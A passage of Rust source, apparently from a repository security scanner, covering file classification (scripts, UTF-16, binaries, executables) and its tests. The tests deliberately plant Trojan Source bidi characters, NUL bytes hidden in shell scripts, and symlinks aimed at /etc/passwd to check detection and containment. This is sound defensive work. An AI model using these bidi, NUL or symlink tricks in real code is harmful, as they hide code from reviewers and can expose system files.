fn classify(slash_path: &str, bytes: &[u8]) -> Class {
    let script = is_script(slash_path, bytes);
    let nul_line = script.then(|| first_nul_line(bytes)).flatten();
    let mut utf16 = false;
    let mut binary_looking = false;

    if let Some(format) = native_format(bytes, None) {
        return Class {
            executable: Some(format),
            nul_line,
            binary_looking: false,
            decode: Decode::AsciiOnly,
        };
    }
    if looks_binary(bytes) {
        // A script with a NUL byte is still a script, and the NUL is reported
        // by its own rule (`nul_line`).
        if !script {
            if has_utf16_bom(bytes) && has_script_extension(slash_path) {
                // Windows PowerShell and WSH read UTF-16 scripts.
                utf16 = true;
            } else if known_binary_magic(bytes) {
                binary_looking = true;
            }
        }
    }
    // Any other file with a NUL byte that does not read as text, and any file
    // with a known binary header, may still be sourced by a shell: `dash` drops
    // the NULs and runs the rest, whatever else is in the file (`GIF89a=1` is a
    // valid assignment). So it goes to the line rules too, but only as ASCII
    // (see `ascii_only_text`), because on data such as icons and audio a rule
    // that looks for a non-ASCII character matches by chance. It is listed, so
    // the report shows that its binary contents were not looked at.
    if !script && !utf16 && bytes.contains(&0) && !nul_file_is_text(bytes) {
        binary_looking = true;
    }
    let decode = if utf16 {
        Decode::Utf16Bom
    } else if binary_looking {
        Decode::AsciiOnly
    } else {
        Decode::Utf8WithoutNuls
    };
    Class {
        executable: None,
        nul_line,
        binary_looking,
        decode,
    }
}

/// The text of a file as the rules read it.
pub(crate) fn decode(decode: Decode, bytes: &[u8]) -> Cow<'_, str> {
    match decode {
        Decode::Utf8WithoutNuls => text_without_nuls(bytes),
        Decode::AsciiOnly => Cow::Owned(ascii_only_text(bytes)),
        Decode::Utf16Bom => Cow::Owned(decode_utf16_bom(bytes)),
    }
}

/// Whether the file is meant to be read as a script: it has a script
/// extension or starts with a shebang. A file with a UTF-16 byte order mark is
/// not one here, because UTF-16 text is full of NUL bytes by design (Windows
/// PowerShell writes it by default); it is decoded instead.
fn is_script(slash_path: &str, bytes: &[u8]) -> bool {
    if has_utf16_bom(bytes) {
        return false;
    }
    has_script_extension(slash_path) || bytes.starts_with(b"#!")
}

fn has_script_extension(slash_path: &str) -> bool {
    slash_path
        .rsplit('/')
        .next()
        .and_then(|name| name.rsplit_once('.'))
        .map(|(_, extension)| extension.to_ascii_lowercase())
        .is_some_and(|ext| SCRIPT_EXTENSIONS.contains(&ext.as_str()))
}

fn has_utf16_bom(bytes: &[u8]) -> bool {
    bytes.starts_with(&[0xFF, 0xFE]) || bytes.starts_with(&[0xFE, 0xFF])
}

/// Decodes UTF-16 after its byte order mark; unpaired surrogates and a odd
/// trailing byte become U+FFFD.
fn decode_utf16_bom(bytes: &[u8]) -> String {
    let little_endian = bytes.starts_with(&[0xFF, 0xFE]);
    let units = bytes[2..].chunks(2).map(|pair| match *pair {
        [a, b] if little_endian => u16::from_le_bytes([a, b]),
        [a, b] => u16::from_be_bytes([a, b]),
        _ => 0xFFFD,
    });
    char::decode_utf16(units)
        .map(|unit| unit.unwrap_or(char::REPLACEMENT_CHARACTER))
        .collect()
}

/// Headers of formats that are binary data by design: archives, compressed
/// streams, images, documents, WebAssembly and fonts. A file with one of them
/// is still read as ASCII by the line rules (a shell may source it).
fn known_binary_magic(bytes: &[u8]) -> bool {
    const MAGICS: [&[u8]; 17] = [
        &[0x1F, 0x8B],
        &[0x28, 0xB5, 0x2F, 0xFD],
        b"BZh",
        &[0xFD, b'7', b'z', b'X', b'Z', 0],
        b"PK\x03\x04",
        b"PK\x05\x06",
        b"7z\xBC\xAF\x27\x1C",
        b"Rar!",
        b"\x89PNG",
        &[0xFF, 0xD8, 0xFF],
        b"GIF8",
        b"%PDF",
        b"\0asm",
        b"RIFF",
        b"wOF",
        b"OTTO",
        b"\0\x01\0\0",
    ];
    MAGICS.iter().any(|magic| bytes.starts_with(magic))
}

/// The file as `dash` and `bash` read it: the NUL bytes are dropped first and
/// the rest is decoded, so a multi-byte character cut by a NUL is whole again.
/// Borrowed exactly when the text is byte for byte the file.
fn text_without_nuls(bytes: &[u8]) -> Cow<'_, str> {
    if !bytes.contains(&0) {
        return String::from_utf8_lossy(bytes);
    }
    let kept: Vec<u8> = bytes.iter().copied().filter(|&b| b != 0).collect();
    Cow::Owned(String::from_utf8_lossy(&kept).into_owned())
}

/// Like `text_without_nuls`, but every non-ASCII byte becomes U+FFFD, so a
/// rule can only match ASCII. Used for NUL-bearing data that does not read as
/// text: the code a shell would run is still there, and noise cannot spell a
/// character by chance.
fn ascii_only_text(bytes: &[u8]) -> String {
    bytes
        .iter()
        .filter(|&&b| b != 0)
        .map(|&b| {
            if b.is_ascii() {
                char::from(b)
            } else {
                char::REPLACEMENT_CHARACTER
            }
        })
        .collect()
}

/// Whether a file that contains NUL bytes reads as text with a few stray ones:
/// the NULs are at most one byte in `MAX_NUL_RATIO`, and the rest is valid
/// UTF-8 once they are removed. Random data (compressed audio, icons) fails the
/// second test almost at once.
fn nul_file_is_text(bytes: &[u8]) -> bool {
    let mut probe = NulProbe::default();
    probe.feed(bytes);
    probe.is_text()
}

/// The two measurements behind `nul_file_is_text`, taken over a stream of
/// chunks so a large file never has to be in memory at once.
#[derive(Default)]
struct NulProbe {
    total: u64,
    nuls: u64,
    /// The start of a multi-byte UTF-8 sequence cut off by the end of a chunk.
    pending: Vec<u8>,
    invalid: bool,
    /// Lines ended before the first NUL byte, counted until it is found.
    newlines: usize,
    /// The 1-based line of the first NUL byte, counting `\n` as shells do.
    first_nul_line: Option<usize>,
    /// The byte offset of the first NUL byte in the file.
    first_nul_offset: Option<u64>,
}

impl NulProbe {
    fn feed(&mut self, chunk: &[u8]) {
        let chunk_start = self.total;
        self.total += chunk.len() as u64;
        if self.first_nul_line.is_none() {
            let before = chunk.iter().position(|&b| b == 0);
            let end = before.unwrap_or(chunk.len());
            self.newlines += chunk[..end].iter().filter(|&&b| b == b'\n').count();
            if let Some(position) = before {
                self.first_nul_line = Some(1 + self.newlines);
                self.first_nul_offset = Some(chunk_start + position as u64);
            }
        }
        for (index, segment) in chunk.split(|&b| b == 0).enumerate() {
            if index > 0 {
                self.nuls += 1;
            }
            if self.invalid || segment.is_empty() {
                continue;
            }
            self.pending.extend_from_slice(segment);
            match std::str::from_utf8(&self.pending) {
                Ok(_) => self.pending.clear(),
                Err(err) if err.error_len().is_none() => {
                    self.pending.drain(..err.valid_up_to());
                }
                Err(_) => self.invalid = true,
            }
        }
    }

    fn is_text(&self) -> bool {
        !self.invalid && self.pending.is_empty() && self.nuls * MAX_NUL_RATIO <= self.total
    }
}

/// The 1-based line of the first NUL byte, counting `\n` as shells do.
fn first_nul_line(bytes: &[u8]) -> Option<usize> {
    let offset = bytes.iter().position(|&b| b == 0)?;
    Some(1 + bytes[..offset].iter().filter(|&&b| b == b'\n').count())
}

/// Names the executable format a file starts with, by its magic bytes:
/// ELF, PE (the `MZ` header), Mach-O in all four byte orders, and fat Mach-O
/// binaries (32 and 64 bit; fat headers are always big-endian on disk). The
/// fat header `CAFEBABE` is also the header of a Java class file; both are
/// code that runs, so both count.
///
/// An `MZ` header counts as PE unless it points at the `PE\0\0` signature
/// (through `e_lfanew` at offset 0x3C) inside the given bytes and that
/// signature is not there: data that only happens to start with `MZ` is not
/// a program. When the bytes are too short to tell, it still counts.
pub(crate) fn executable_format(bytes: &[u8]) -> Option<&'static str> {
    match bytes {
        [0x7F, b'E', b'L', b'F', ..] => Some("ELF"),
        [b'M', b'Z', ..] => pe_signature_not_missing(bytes).then_some("PE"),
        [0xFE, 0xED, 0xFA, 0xCE | 0xCF, ..] | [0xCE | 0xCF, 0xFA, 0xED, 0xFE, ..] => Some("Mach-O"),
        [0xCA, 0xFE, 0xBA, 0xBE | 0xBF, ..] => Some("Mach-O fat (or Java class)"),
        _ => None,
    }
}

/// False only when an `MZ` header's `e_lfanew` points inside `bytes` and the
/// four bytes there are not `PE\0\0`.
fn pe_signature_not_missing(bytes: &[u8]) -> bool {
    let Some(&[a, b, c, d]) = bytes.get(0x3C..0x40) else {
        return true;
    };
    let offset = u32::from_le_bytes([a, b, c, d]) as usize;
    match offset.checked_add(4).and_then(|end| bytes.get(offset..end)) {
        Some(signature) => signature == b"PE\0\0",
        None => true,
    }
}

/// Same heuristic as git and ripgrep: a NUL byte near the start means binary.
pub(crate) fn looks_binary(bytes: &[u8]) -> bool {
    bytes.iter().take(BINARY_SNIFF_LEN).any(|&b| b == 0)
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use globset::{GlobBuilder, GlobSetBuilder};

    use super::*;
    use crate::checks::Hit;
    use crate::finding::{Severity, Stage};
    use crate::rule::parse_rules;

    const RULES: &str = r#"
        [[rule]]
        id = "test.everywhere"
        engine = "line-regex"
        family = "test"
        stage = "run"
        severity = "low"
        description = "Matches TODO anywhere"
        example = "a.txt:1"
        pattern = 'TODO'

        [[rule]]
        id = "test.only-json"
        engine = "line-regex"
        family = "test"
        stage = "ide"
        severity = "high"
        description = "Matches TODO in JSON under .vscode"
        example = ".vscode/tasks.json:1"
        pattern = 'TODO'
        files = [".vscode/*.json"]
    "#;

    fn write(root: &Path, relative: &str, contents: &[u8]) {
        let path = root.join(relative);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, contents).unwrap();
    }

    /// A file-level rule that reports what the engine handed to its check.
    fn probe(ctx: &Ctx<'_>) -> Vec<Hit> {
        vec![Hit {
            line: 1,
            span: None,
            severity: ctx.base,
            reason: format!(
                "path={} bytes={} issue={:?} helper={} truncated={}",
                ctx.path,
                ctx.bytes().len(),
                ctx.issue,
                ctx.repo.has_module("helper"),
                ctx.truncated
            ),
        }]
    }

    fn file_rule(glob: &str, check: Check) -> Rule {
        let mut globs = GlobSetBuilder::new();
        globs.add(
            GlobBuilder::new(glob)
                .case_insensitive(true)
                .build()
                .unwrap(),
        );
        Rule {
            id: "test.file".to_string(),
            family: "test".to_string(),
            stage: Stage::Deps,
            severity: Severity::High,
            attack: vec![],
            description: "test".to_string(),
            example: "x".to_string(),
            matcher: Matcher::File(check),
            files: Some(globs.build().unwrap()),
            names_executables: false,
        }
    }

    fn explanations(report: &Report) -> Vec<(String, String)> {
        report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.explanation.clone()))
            .collect()
    }

    #[test]
    fn findings_have_file_line_and_rule_metadata() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.txt", b"fine\nTODO here\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.files_scanned, 1);
        assert_eq!(report.findings.len(), 1);
        let finding = &report.findings[0];
        assert_eq!(finding.rule_id, "test.everywhere");
        assert_eq!(finding.file, PathBuf::from("a.txt"));
        assert_eq!(finding.line, 2);
    }

    #[test]
    fn file_globs_limit_where_a_rule_runs() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), ".vscode/tasks.json", b"TODO\n");
        write(dir.path(), "notes.json", b"TODO\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let ids: Vec<_> = report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.rule_id.as_str()))
            .collect();
        assert_eq!(
            ids,
            [
                (".vscode/tasks.json".to_string(), "test.everywhere"),
                (".vscode/tasks.json".to_string(), "test.only-json"),
                ("notes.json".to_string(), "test.everywhere"),
            ]
        );
    }

    #[test]
    fn binary_files_are_line_scanned_as_ascii_and_listed() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "blob.bin", b"\x1f\x8b\0\0TODO");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.files_scanned, 1);
        assert_eq!(report.findings.len(), 1);
        assert!(
            report.findings[0]
                .explanation
                .ends_with("(found in a binary-looking file)")
        );
        assert_eq!(
            report.skipped,
            [Skipped {
                path: PathBuf::from("blob.bin"),
                reason: SkipReason::Binary,
            }]
        );
    }

    #[test]
    fn crlf_line_endings_count_lines_correctly() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.txt", b"one\r\ntwo\r\nTODO\r\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.findings[0].line, 3);
    }

    #[test]
    fn a_scan_that_read_everything_is_complete() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.txt", b"fine\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(report.is_complete());
        assert_eq!(report.inconclusive_count(), 0);
    }

    #[test]
    fn unread_and_executable_files_make_the_scan_incomplete() {
        let skip = |reason| Skipped {
            path: PathBuf::from("x"),
            reason,
        };
        for reason in [
            SkipReason::TooLarge { size: 9 },
            SkipReason::Unreadable {
                error: "denied".to_string(),
            },
            SkipReason::Executable {
                format: "ELF",
                reported: false,
            },
        ] {
            let report = Report {
                skipped: vec![skip(reason.clone())],
                ..Report::default()
            };
            assert!(!report.is_complete(), "{reason:?}");
            assert_eq!(report.inconclusive_count(), 1);
        }
    }

    #[test]
    fn a_binary_that_was_read_but_has_no_rules_does_not_make_the_scan_incomplete() {
        let report = Report {
            skipped: vec![Skipped {
                path: PathBuf::from("data.gz"),
                reason: SkipReason::Binary,
            }],
            ..Report::default()
        };

        assert!(report.is_complete());
        assert_eq!(report.inconclusive_count(), 0);
    }

    #[test]
    fn an_mz_header_is_a_pe_only_with_its_signature() {
        let mut pe = vec![0u8; 0x48];
        pe[..2].copy_from_slice(b"MZ");
        pe[0x3C] = 0x40;
        pe[0x40..0x44].copy_from_slice(b"PE\0\0");
        assert_eq!(executable_format(&pe), Some("PE"));
        pe[0x40..0x44].copy_from_slice(b"text");
        assert_eq!(
            executable_format(&pe),
            None,
            "MZ data without a PE signature"
        );
        // When the bytes cannot tell, it still counts.
        assert_eq!(
            executable_format(b"MZ\x90\0\x03\0"),
            Some("PE"),
            "too short"
        );
        let mut far = vec![0u8; 0x48];
        far[..2].copy_from_slice(b"MZ");
        far[0x3C..0x40].copy_from_slice(&0xFFFF_FF00u32.to_le_bytes());
        assert_eq!(
            executable_format(&far),
            Some("PE"),
            "signature past the bytes"
        );
    }

    #[test]
    fn executable_formats_are_recognised_by_their_magic_bytes() {
        let cases: [(&[u8], Option<&str>); 12] = [
            (b"\x7fELF\x02\x01\x01\0", Some("ELF")),
            (b"MZ\x90\0\x03\0", Some("PE")),
            (&[0xFE, 0xED, 0xFA, 0xCE, 0, 0], Some("Mach-O")),
            (&[0xFE, 0xED, 0xFA, 0xCF, 0, 0], Some("Mach-O")),
            (&[0xCE, 0xFA, 0xED, 0xFE, 0, 0], Some("Mach-O")),
            (&[0xCF, 0xFA, 0xED, 0xFE, 0, 0], Some("Mach-O")),
            (
                &[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 2],
                Some("Mach-O fat (or Java class)"),
            ),
            (
                &[0xCA, 0xFE, 0xBA, 0xBF, 0, 0, 0, 2],
                Some("Mach-O fat (or Java class)"),
            ),
            (&[0x1F, 0x8B, 8, 0, 0], None),
            (&[0x28, 0xB5, 0x2F, 0xFD, 0], None),
            (b"\x89PNG\r\n\x1a\n\0", None),
            (b"", None),
        ];
        for (bytes, expected) in cases {
            assert_eq!(executable_format(bytes), expected, "{bytes:?}");
        }
    }

    #[test]
    fn an_executable_that_a_file_rule_examined_is_still_listed() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "helper.start", b"\x7fELF\x02\x01\x01\0\0\0\0\0");
        let rules = vec![file_rule("*.start", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.inconclusive_count(), 1);
        assert!(!report.is_complete());
    }

    #[test]
    fn an_elf_binary_is_listed_as_an_executable_and_a_gzip_file_as_plain_binary() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "tool", b"\x7fELF\x02\x01\x01\0\0\0\0\0");
        write(dir.path(), "data.gz", &[0x1F, 0x8B, 8, 0, 0, 0, 0, 0]);
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let reasons: Vec<_> = report
            .skipped
            .iter()
            .map(|s| (to_slash(&s.path), s.reason.clone()))
            .collect();
        assert_eq!(
            reasons,
            [
                ("data.gz".to_string(), SkipReason::Binary),
                (
                    "tool".to_string(),
                    SkipReason::Executable {
                        format: "ELF",
                        reported: false,
                    }
                ),
            ]
        );
        assert!(
            !report.is_complete(),
            "the executable makes it inconclusive"
        );
        assert_eq!(report.inconclusive_count(), 1);
    }

    #[test]
    fn a_symlink_alone_does_not_make_the_scan_incomplete() {
        let report = Report {
            skipped: vec![Skipped {
                path: PathBuf::from("link"),
                reason: SkipReason::Symlink { target: None },
            }],
            ..Report::default()
        };

        assert!(report.is_complete());
    }

    #[test]
    fn a_payload_past_the_file_limit_is_missed_and_the_scan_is_not_complete() {
        let dir = tempfile::tempdir().unwrap();
        // Padding sorts before the payload, so the limit cuts the payload off.
        for name in ["a1.txt", "a2.txt", "a3.txt", "a4.txt"] {
            write(dir.path(), name, b"padding\n");
        }
        write(dir.path(), "z-payload.txt", b"TODO payload\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();
        let limits = Limits {
            max_files: 4,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        assert!(report.findings.is_empty(), "the payload was never read");
        assert!(report.truncated);
        assert!(
            !report.is_complete(),
            "no findings must not mean clean here"
        );
    }

    #[test]
    fn file_rules_see_raw_bytes_of_binary_looking_files() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "x.pth", b"# \0 comment\nimport os\n");
        write(dir.path(), "other.bin", b"\x1f\x8b\0\0");
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        let found = explanations(&report);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].0, "x.pth");
        assert!(found[0].1.contains("bytes=22 issue=None"), "{}", found[0].1);
        // The text file a rule examined is not listed; the binary one is
        // read as ASCII by the line rules and listed.
        assert_eq!(report.files_scanned, 2);
        assert_eq!(
            report.skipped,
            [Skipped {
                path: PathBuf::from("other.bin"),
                reason: SkipReason::Binary,
            }]
        );
    }

    #[test]
    fn file_rules_only_run_on_files_their_globs_select() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.pth", b"x");
        write(dir.path(), "a.txt", b"x");
        write(dir.path(), "UPPER.PTH", b"x");
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        let files: Vec<_> = explanations(&report)
            .into_iter()
            .map(|(file, _)| file)
            .collect();
        assert_eq!(files, ["UPPER.PTH", "a.pth"]);
    }

    #[test]
    fn oversized_files_reach_file_rules_with_an_issue_and_stay_in_skipped() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "big.pth", &[b'#'; 100]);
        let limits = Limits {
            max_file_size: 10,
            ..Limits::default()
        };
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, limits);

        let found = explanations(&report);
        assert_eq!(found.len(), 1);
        assert!(
            found[0]
                .1
                .contains("bytes=0 issue=Some(TooLarge { size: 100 })"),
            "{}",
            found[0].1
        );
        assert_eq!(report.skipped.len(), 1);
        assert!(matches!(
            report.skipped[0].reason,
            SkipReason::TooLarge { size: 100 }
        ));
    }

    #[cfg(unix)]
    #[test]
    fn symlinks_reach_file_rules_with_the_target_content_when_it_is_inside() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "docs/notes.txt", b"12345");
        std::os::unix::fs::symlink("docs/notes.txt", dir.path().join("inside.pth")).unwrap();
        std::os::unix::fs::symlink("../../etc/passwd", dir.path().join("outside.pth")).unwrap();
        std::os::unix::fs::symlink("/etc/passwd", dir.path().join("absolute.pth")).unwrap();
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        let found = explanations(&report);
        let get = |name: &str| {
            found
                .iter()
                .find(|(file, _)| file == name)
                .unwrap()
                .1
                .clone()
        };
        assert!(
            get("inside.pth").contains("bytes=5 issue=Some(Symlink"),
            "{}",
            get("inside.pth")
        );
        assert!(get("outside.pth").contains("bytes=0 issue=Some(Symlink"));
        assert!(get("absolute.pth").contains("bytes=0 issue=Some(Symlink"));
        // All three are still listed as not followed.
        assert_eq!(
            report
                .skipped
                .iter()
                .filter(|s| matches!(s.reason, SkipReason::Symlink { .. }))
                .count(),
            3
        );
    }

    #[test]
    fn symlink_targets_are_resolved_without_touching_anything_outside() {
        let link = Path::new("a/b/link.pth");
        assert_eq!(
            resolve_inside(link, Path::new("../c.txt")),
            Some(PathBuf::from("a/c.txt"))
        );
        assert_eq!(
            resolve_inside(link, Path::new("./d/e.txt")),
            Some(PathBuf::from("a/b/d/e.txt"))
        );
        assert_eq!(resolve_inside(link, Path::new("../../../x")), None);
        assert_eq!(resolve_inside(link, Path::new("/etc/passwd")), None);
        assert_eq!(
            resolve_inside(Path::new("top.pth"), Path::new("../x")),
            None
        );
    }

    #[test]
    fn file_rules_can_ask_whether_a_module_is_in_the_repository() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.pth", b"x");
        write(dir.path(), "lib/helper.py", b"x");
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(explanations(&report)[0].1.contains("helper=true"));
    }

    #[test]
    fn file_rules_are_told_when_the_walk_was_cut_short() {
        let dir = tempfile::tempdir().unwrap();
        for name in ["a.pth", "b.txt", "c.txt"] {
            write(dir.path(), name, b"x");
        }
        let limits = Limits {
            max_files: 2,
            ..Limits::default()
        };
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, limits);

        assert!(report.truncated);
        assert!(explanations(&report)[0].1.contains("truncated=true"));
    }

    #[test]
    fn jsonc_checks_see_the_repository_index_and_the_decoded_text() {
        fn probe_jsonc(ctx: &Ctx<'_>) -> Vec<Hit> {
            vec![Hit {
                line: 1,
                span: None,
                severity: ctx.base,
                reason: format!(
                    "path={} helper={} truncated={} parsed={} text={:?}",
                    ctx.path,
                    ctx.repo.has_module("helper"),
                    ctx.truncated,
                    ctx.jsonc().is_ok(),
                    ctx.text().trim_end(),
                ),
            }]
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "helper.py", b"");
        // A jsonc check now gets the repository index like a file check does.
        write(dir.path(), "a.json", b"{\"k\": 1}\n");
        let mut rule = file_rule("**/*.json", probe_jsonc);
        rule.matcher = Matcher::Jsonc(probe_jsonc);

        let report = scan(dir.path(), &[rule], Limits::default());

        assert_eq!(
            explanations(&report),
            [(
                "a.json".to_string(),
                r#"path=a.json helper=true truncated=false parsed=true text="{\"k\": 1}""#
                    .to_string()
            )]
        );
    }

    #[test]
    fn file_rule_explanations_are_cleaned_and_long_lists_are_capped() {
        fn noisy(_: &Ctx<'_>) -> Vec<Hit> {
            (1..=150)
                .map(|line| Hit {
                    line,
                    span: None,
                    severity: Severity::High,
                    reason: "bad \u{1b}[2J text".to_string(),
                })
                .collect()
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.pth", b"x");
        let rules = [file_rule("**/*.pth", noisy)];

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.findings.len(), MAX_FINDINGS_PER_FILE_CHECK);
        assert!(
            report
                .findings
                .iter()
                .all(|f| !f.explanation.contains('\u{1b}'))
        );
        let last = report.findings.last().unwrap();
        assert!(last.explanation.contains("50 more"), "{}", last.explanation);
    }

    // ---- scripts with NUL bytes -------------------------------------------

    use crate::rule::builtin_rules;

    const NUL_RULE: &str = "deception.nul-byte-in-script";
    const BIDI: &str = "\u{202e}";

    fn builtin_findings(report: &Report, rule_id: &str) -> Vec<(String, usize)> {
        report
            .findings
            .iter()
            .filter(|f| f.rule_id == rule_id)
            .map(|f| (to_slash(&f.file), f.line))
            .collect()
    }

    #[test]
    fn a_shell_script_with_a_nul_in_a_comment_still_reaches_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        // The NUL is on line 1; a Trojan Source character sits on line 2.
        write(
            dir.path(),
            "install.sh",
            format!("# a\0b\necho {BIDI}\n").as_bytes(),
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("install.sh".to_string(), 1)]
        );
        assert_eq!(
            builtin_findings(&report, "deception.bidi-control"),
            [("install.sh".to_string(), 2)],
            "the line rules must see what follows the NUL byte"
        );
        assert!(report.skipped.is_empty(), "{:?}", report.skipped);
        assert!(report.is_complete());
        assert_eq!(report.files_scanned, 1);
    }

    #[test]
    fn a_file_with_a_shebang_and_no_extension_is_a_script() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "configure", b"#!/bin/sh\n# x\0y\n");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("configure".to_string(), 2)]
        );
        assert!(report.skipped.is_empty());
    }

    #[test]
    fn a_nul_byte_far_from_the_start_of_a_script_is_still_reported() {
        let dir = tempfile::tempdir().unwrap();
        // Past the 8 KiB window used to sniff for binaries.
        let content = format!("{}\0\n", "echo hi\n".repeat(5000));
        write(dir.path(), "late.sh", content.as_bytes());
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("late.sh".to_string(), 5001)]
        );
    }

    #[test]
    fn extensions_are_matched_without_regard_to_case() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "RUN.SH", b"# a\0b\n");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("RUN.SH".to_string(), 1)]
        );
    }

    #[test]
    fn files_with_a_known_binary_header_stay_binary() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "image.png", b"\x89PNG\0\0");
        write(dir.path(), "data.gz", &[0x1F, 0x8B, 8, 0, 0]);
        write(dir.path(), "module.wasm", b"\0asm\x01\0\0\0");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(builtin_findings(&report, NUL_RULE).is_empty());
        assert_eq!(report.skipped.len(), 3);
        assert!(
            report
                .skipped
                .iter()
                .all(|s| s.reason == SkipReason::Binary)
        );
        // Read, listed, and no rules for the format: that does not make the
        // scan inconclusive (an executable binary would).
        assert!(report.is_complete());
    }

    #[test]
    fn a_utf16_script_is_decoded_and_read_by_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        let utf16 = |text: &str, le: bool| {
            let mut bytes = if le {
                vec![0xFF, 0xFE]
            } else {
                vec![0xFE, 0xFF]
            };
            for unit in text.encode_utf16() {
                bytes.extend(if le {
                    unit.to_le_bytes()
                } else {
                    unit.to_be_bytes()
                });
            }
            bytes
        };
        write(dir.path(), "legit.ps1", &utf16("Write-Host", true));
        write(
            dir.path(),
            "bidi.ps1",
            &utf16("# a\n# \u{202E}evil\n", true),
        );
        write(dir.path(), "bidi-be.vbs", &utf16("' \u{202E}evil\n", false));
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(builtin_findings(&report, NUL_RULE).is_empty());
        assert!(report.skipped.is_empty());
        let bidi: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "deception.bidi-control")
            .map(|f| (to_slash(&f.file), f.line))
            .collect();
        assert_eq!(
            bidi,
            [("bidi-be.vbs".to_string(), 1), ("bidi.ps1".to_string(), 2)]
        );
    }

    #[test]
    fn a_file_with_a_nul_and_no_known_header_still_reaches_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        // Sourced by install.sh; dash drops the NUL and runs the rest.
        write(dir.path(), "lib/common", b"# x\n\0\n# \xE2\x80\xAEevil\n");
        write(dir.path(), ".envrc", b"a\0\n# \xE2\x80\xAEevil\n");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let lines: Vec<_> = report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.line))
            .collect();
        assert_eq!(
            lines,
            [(".envrc".to_string(), 2), ("lib/common".to_string(), 3)]
        );
        assert!(report.skipped.is_empty());
    }

    /// Bytes that are not valid UTF-8 (0xFF never is) around a sequence the
    /// bidi rule would match, with a few NULs, like the middle of an icon or
    /// an audio stream.
    fn noise_with_bidi(header: &[u8]) -> Vec<u8> {
        let mut bytes = header.to_vec();
        for i in 0..400u32 {
            bytes.push((i.wrapping_mul(37) % 251) as u8 | 0x80);
        }
        bytes.extend_from_slice(&[0xFF, 0xE2, 0x80, 0xAE, 0xFF]);
        bytes.extend_from_slice(&[0x11; 200]);
        bytes
    }

    #[test]
    fn binary_data_without_a_known_header_gets_no_findings_from_non_ascii_rules() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "icon.icns", &noise_with_bidi(b"icns\0\0\x10\0"));
        write(
            dir.path(),
            "voice.mp3",
            &noise_with_bidi(b"ID3\x03\0\0\0\0\x0a\0"),
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(report.findings.is_empty(), "{:?}", report.findings);
        assert!(report.is_complete());
    }

    #[test]
    fn a_script_is_read_even_when_the_rest_of_it_is_binary() {
        // Scripts keep the rule that a NUL does not make them binary: the
        // zipapp pattern (see the NUL rule) and the NUL itself are reported.
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "tool.sh",
            &noise_with_bidi(b"#!/bin/sh\n# a\0b\n"),
        );
